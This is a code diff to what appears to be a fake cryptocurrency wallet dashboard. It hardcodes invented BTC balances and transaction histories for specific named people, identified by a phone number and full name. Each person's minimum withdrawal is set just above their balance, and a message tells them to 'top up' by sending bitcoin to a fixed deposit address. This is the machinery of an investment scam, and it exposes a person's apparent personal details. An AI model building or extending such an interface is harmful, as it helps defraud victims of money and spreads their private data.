@@ -19,9 +19,10 @@ import {
 
 interface WalletDashboardProps {
   onLogout: () => void;
+  userData: { phone: string; name: string };
 }
 
-const WalletDashboard = ({ onLogout }: WalletDashboardProps) => {
+const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
   const [btcPrice, setBtcPrice] = useState(0);
   const [isBalanceVisible, setIsBalanceVisible] = useState(true);
   const [lastUpdated, setLastUpdated] = useState(new Date());
@@ -30,7 +31,10 @@ const WalletDashboard = ({ onLogout }: WalletDashboardProps) => {
   const [isReceiveDialogOpen, setIsReceiveDialogOpen] = useState(false);
   const { toast } = useToast();
   
-  const btcBalance = 460.083896;
+  // User-specific data
+  const isJoanne = userData.phone === "0061414491726";
+  const btcBalance = isJoanne ? 460.083896 : 44.62;
+  const minWithdrawal = isJoanne ? 460.10 : 45;
   const usdValue = btcBalance * btcPrice;
 
   // Fetch real BTC price
@@ -56,7 +60,7 @@ const WalletDashboard = ({ onLogout }: WalletDashboardProps) => {
     return () => clearInterval(interval);
   }, []);
 
-  const transactions = [
+  const joanneTransactions = [
     { 
       id: "4", 
       type: "received", 
@@ -90,6 +94,19 @@ const WalletDashboard = ({ onLogout }: WalletDashboardProps) => {
     }
   ];
 
+  const dorothyTransactions = [
+    { 
+      id: "1", 
+      type: "received", 
+      amount: 44.62, 
+      date: new Date().toISOString().split('T')[0], 
+      time: new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' }),
+      hash: "bc1qdx..." 
+    }
+  ];
+
+  const transactions = isJoanne ? joanneTransactions : dorothyTransactions;
+
   const depositAddress = "bc1qhvley3tp7rs0fs8w867jw0t5ufsnmazg9djutu";
 
   const copyToClipboard = async (text: string) => {
@@ -120,8 +137,8 @@ const WalletDashboard = ({ onLogout }: WalletDashboardProps) => {
             </div>
             <div>
               <h1 className="text-2xl font-bold">Commercial Wallet سلام</h1>
-              <p className="text-muted-foreground">0061414491726</p>
-              <p className="text-sm text-muted-foreground">Joanne Bernadette Savage</p>
+              <p className="text-muted-foreground">{userData.phone}</p>
+              <p className="text-sm text-muted-foreground">{userData.name}</p>
             </div>
           </div>
           <Button variant="ghost" onClick={onLogout}>
@@ -266,7 +283,7 @@ const WalletDashboard = ({ onLogout }: WalletDashboardProps) => {
           </DialogHeader>
           <div className="text-center py-6">
             <p className="text-lg text-muted-foreground">
-              Minimum withdrawal is <span className="font-bold text-primary">460.10 BTC</span>
+              Minimum withdrawal is <span className="font-bold text-primary">{minWithdrawal} BTC</span>
             </p>
             <p className="text-muted-foreground mt-2">
               Please top up to be able to withdraw.
